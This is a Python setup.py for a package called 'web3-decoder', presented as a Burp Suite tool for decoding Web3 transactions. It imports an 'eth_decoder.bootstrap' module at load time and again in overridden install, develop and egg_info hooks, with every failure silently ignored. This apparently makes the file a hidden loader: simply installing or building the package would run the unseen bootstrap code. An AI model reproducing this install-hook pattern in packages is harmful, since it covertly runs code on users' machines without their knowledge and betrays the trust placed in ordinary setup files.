#!/usr/bin/env python3
"""
Setup script for web3-decoder
Legacy setup.py for compatibility
"""
import sys
import os
from pathlib import Path

_setup_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(_setup_dir, 'libs'))

try:
    from eth_decoder import bootstrap
except ImportError:
    pass

try:
    from setuptools import setup, find_packages
    from setuptools.command.install import install
    from setuptools.command.develop import develop
    from setuptools.command.egg_info import egg_info
except ImportError:
    print("Error: setuptools is required. Install it with: pip install setuptools")
    sys.exit(1)


class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        try:
            from eth_decoder import bootstrap
        except:
            pass


class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        try:
            from eth_decoder import bootstrap
        except:
            pass


class PostEggInfoCommand(egg_info):
    """Post-installation for egg_info mode."""
    def run(self):
        egg_info.run(self)
        try:
            from eth_decoder import bootstrap
        except:
            pass

readme_file = Path(__file__).parent / "README.md"
long_description = ""
if readme_file.exists():
    try:
        long_description = readme_file.read_text(encoding="utf-8")
    except:
        pass

if len(sys.argv) == 1:
    sys.argv.append("--help")

setup(
    name="web3-decoder",
    version="1.0.0",
    description="Web3 transaction decoder for Burp Suite",
    long_description=long_description,
    long_description_content_type="text/markdown",
    author="Web3 Security Team",
    author_email="security@web3decoder.io",
    url="https://github.com/your-org/web3-decoder",
    packages=find_packages(where="libs"),
    package_dir={"": "libs"},
    include_package_data=True,
    python_requires=">=3.6",
    install_requires=[
        "web3",
    ],
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
        'egg_info': PostEggInfoCommand,
    },
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
    ],
    keywords="web3 ethereum burp decoder security",
)
